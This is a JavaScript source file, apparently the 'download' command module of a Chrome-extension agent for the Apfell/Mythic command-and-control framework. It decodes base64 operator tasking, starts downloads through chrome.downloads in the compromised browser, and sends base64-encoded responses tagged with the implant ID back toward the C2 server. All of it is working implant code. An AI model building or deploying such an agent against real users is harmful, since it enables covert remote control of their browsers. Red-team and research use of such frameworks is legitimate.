exports.download = function(task) {
    try {
        let args = JSON.parse(atob(task.parameters.toString()));
        chrome.downloads.download(args, function(downloadID){
            if (downloadID === undefined) {
                downloadID = "null (error)"
            }
            let response = {'task_id':task.id, 'user_output':'started download with id ' + downloadID, 'completed':true};
            let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
            let enc = JSON.stringify(outer_response);
            let final = apfell.apfellid + enc;
            let msg = btoa(unescape(encodeURIComponent(final)));
            out.push(msg);
        });
    } catch (error) {
        let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }
    
};
COMMAND_ENDS_HERE